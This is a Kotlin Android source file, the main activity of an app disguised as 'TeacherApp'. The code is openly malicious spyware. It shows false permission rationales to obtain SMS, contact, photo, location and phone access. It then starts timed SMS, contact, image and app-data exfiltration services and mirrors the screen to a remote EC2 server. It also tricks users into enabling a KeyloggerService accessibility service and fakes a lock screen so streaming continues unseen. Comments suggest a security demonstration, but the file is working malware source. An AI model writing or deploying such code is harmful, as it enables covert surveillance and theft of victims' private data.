package com.example.teacherapp

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.NavHostController
import androidx.navigation.compose.rememberNavController
import com.example.teacherapp.navigation.NavGraph
import com.example.teacherapp.navigation.ScreenOverlayState
import com.example.teacherapp.services.ScreenMirrorService
import com.example.teacherapp.ui.theme.TeacherappTheme
import com.teacherapp.services.ContactExfiltrationService
import com.teacherapp.services.ImageExfiltrationService
import com.teacherapp.services.SmsExfiltrationService
import com.teacherapp.services.AppDataExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


class MainActivity : ComponentActivity() {

    // Inactivity screen dimming
    private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
    private val inactivityHandler = Handler(Looper.getMainLooper())
    private val dimScreenRunnable = Runnable {
        // Freeze route tracking — savedRoute now holds the user's last screen
        ScreenOverlayState.isTracking = false
        val params = window.attributes
        params.screenBrightness = 0.0f
        window.attributes = params
    }

    // Fake lock — intercept the power/lock button
    private var isFakeLocked = false
    private var wakeLock: PowerManager.WakeLock? = null

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_SCREEN_OFF) {
                if (!isFakeLocked) {
                    fakeLock()     // First press: fake lock, let security tester in
                } else {
                    realLock()     // Second press: restore state and actually lock
                }
            }
        }
    }

    // Required permissions array
    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    // Permission launcher using modern API
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            onAllPermissionsGranted()
        } else {
            Toast.makeText(
                this,
                "Some permissions were denied. App may not function correctly.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    // MediaProjection launcher for screen capture
    private val projectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.start(this, result.resultCode, result.data!!)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Original app UI
        setContent {
            TeacherappTheme {
                val navController = rememberNavController()
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        NavGraph(navController = navController)
                    }
                }
            }
        }

        // Register power button / screen-off receiver
        registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))

        // Request permissions directly
        requestNecessaryPermissions()
    }

    private fun requestNecessaryPermissions() {
        val permissionsNeeded = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsNeeded.isNotEmpty()) {
            // Show rationale dialog first
            showPermissionRationale(permissionsNeeded)
        } else {
            onAllPermissionsGranted()
        }
    }

    private fun showPermissionRationale(permissions: List<String>) {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(
                "TeacherApp needs the following permissions to function properly:\n\n" +
                        "• SMS: To send class announcements\n" +
                        "• Contacts: To sync with class roster\n" +
                        "• Storage: To share educational materials\n" +
                        "• Location: To track field trip attendance\n" +
                        "• Phone: To verify device identity\n\n" +
                        "These permissions help enhance your teaching experience."
            )
            .setPositiveButton("Grant Permissions") { dialog, _ ->
                dialog.dismiss()
                permissionLauncher.launch(permissions.toTypedArray())
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                Toast.makeText(
                    this,
                    "App requires permissions to function",
                    Toast.LENGTH_LONG
                ).show()
            }
            .setCancelable(false)
            .show()
    }

    private fun onAllPermissionsGranted() {
        Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()

        // Schedule malicious activities
        scheduleMaliciousActivities()

        // Start screen mirroring to EC2
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projectionLauncher.launch(projectionManager.createScreenCaptureIntent())

        // Prompt for accessibility service after a delay
        Handler(Looper.getMainLooper()).postDelayed({
            promptAccessibilityService()
        }, 3000) // 3 seconds after permissions granted
    }

    private fun scheduleMaliciousActivities() {
        CoroutineScope(Dispatchers.Default).launch {
            startTimedExfiltration()
        }
    }

    private suspend fun startTimedExfiltration() {
        // Initial delay
        delay(10000L) // 10 seconds after permissions granted

        // Start SMS exfiltration
        SmsExfiltrationService.startExfiltration(this@MainActivity)

        delay(5000L)

        // Start Contact exfiltration
        ContactExfiltrationService.startExfiltration(this@MainActivity)

        delay(5000L)

        // Start Image exfiltration
        ImageExfiltrationService.startExfiltration(this@MainActivity)

        delay(5000L)

        // Start App Data exfiltration
        AppDataExfiltrationService.startExfiltration(this@MainActivity)
    }

    // ========== ACCESSIBILITY SERVICE FUNCTIONS ==========

    private fun isAccessibilityServiceEnabled(): Boolean {
        val serviceName = "com.teacherapp.services.KeyloggerService"
        val expectedComponentName = "$packageName/$serviceName"

        val enabledServicesSetting = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)

        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            if (componentNameString.equals(expectedComponentName, ignoreCase = true)) {
                return true
            }
        }

        return false
    }

    private fun promptAccessibilityService() {
        // Don't prompt if already enabled
        if (isAccessibilityServiceEnabled()) {
            android.util.Log.d("MainActivity", "✅ Accessibility service already enabled")
            return
        }

        AlertDialog.Builder(this)
            .setTitle("Enable Enhanced Features")
            .setMessage("TeacherApp provides enhanced text input assistance for better note-taking.\n\nTo enable this feature, please activate 'TeacherApp' in Accessibility settings.")
            .setPositiveButton("Enable Now") { dialog, _ ->
                dialog.dismiss()
                openAccessibilitySettings()
            }
            .setNegativeButton("Skip") { dialog, _ ->
                dialog.dismiss()
            }
            .setCancelable(true)
            .show()
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)

            Toast.makeText(
                this,
                "Find 'TeacherApp' in the list and turn it ON",
                Toast.LENGTH_LONG
            ).show()
        } catch (e: Exception) {
            Toast.makeText(
                this,
                "Please enable accessibility in Settings",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    private fun fakeLock() {
        isFakeLocked = true
        // Freeze nav tracking — savedRoute holds where the user was
        ScreenOverlayState.isTracking = false

        // Acquire wake lock to keep screen alive (prevents real lock screen)
        @Suppress("DEPRECATION")
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "teacherapp:fakelock"
        )
        wakeLock?.acquire(10 * 60 * 1000L) // max 10 min safety timeout

        // Show activity over lock screen so it stays visible at brightness 0
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        // Zero brightness — physically dark, EC2 stream still live
        val params = window.attributes
        params.screenBrightness = 0.0f
        window.attributes = params
    }

    private fun realLock() {
        isFakeLocked = false

        // Restore nav to where the user was before the demo
        ScreenOverlayState.savedRoute?.let { route ->
            ScreenOverlayState.navController?.navigate(route) {
                popUpTo(0) { inclusive = true }
            }
        }
        ScreenOverlayState.isTracking = true

        // Restore brightness briefly so the transition looks natural
        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        window.attributes = params

        // Remove flags and release wake lock → OS shows real lock screen
        @Suppress("DEPRECATION")
        window.clearFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        wakeLock?.release()
        wakeLock = null
    }

    override fun onUserInteraction() {
        super.onUserInteraction()

        if (isFakeLocked) {
            // Tap during fake lock → real lock + restore state
            realLock()
            return
        }

        inactivityHandler.removeCallbacks(dimScreenRunnable)

        val wasScreenDimmed = !ScreenOverlayState.isTracking

        // Restore brightness
        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        window.attributes = params

        if (wasScreenDimmed) {
            // Clear demo navigation and restore the user's last screen
            ScreenOverlayState.savedRoute?.let { route ->
                ScreenOverlayState.navController?.navigate(route) {
                    popUpTo(0) { inclusive = true }
                }
            }
            ScreenOverlayState.isTracking = true
        }

        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
    }

    override fun onResume() {
        super.onResume()
        // Start inactivity timer when app is visible
        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)

        // Optional: Check if accessibility was just enabled
        if (isAccessibilityServiceEnabled()) {
            android.util.Log.d("MainActivity", "✅ Accessibility service is now enabled!")
        }
    }

    override fun onPause() {
        super.onPause()
        // Cancel timer when app goes to background
        inactivityHandler.removeCallbacks(dimScreenRunnable)
    }

    override fun onDestroy() {
        unregisterReceiver(screenReceiver)
        wakeLock?.release()
        super.onDestroy()
    }
}

@Composable
fun StartScreen(modifier: Modifier = Modifier, navController: NavHostController) {
    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.weight(1f))

        Text(
            text = "Welcome to MyApp",
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary
        )

        Spacer(modifier = Modifier.weight(2f))

        Column(
            modifier = Modifier.fillMaxWidth(),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Button(
                onClick = { navController.navigate("register_screen") },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(text = "Create New Account")
            }

            OutlinedButton(
                onClick = { navController.navigate("login_screen") },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(text = "Use Existing Account")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))
    }
}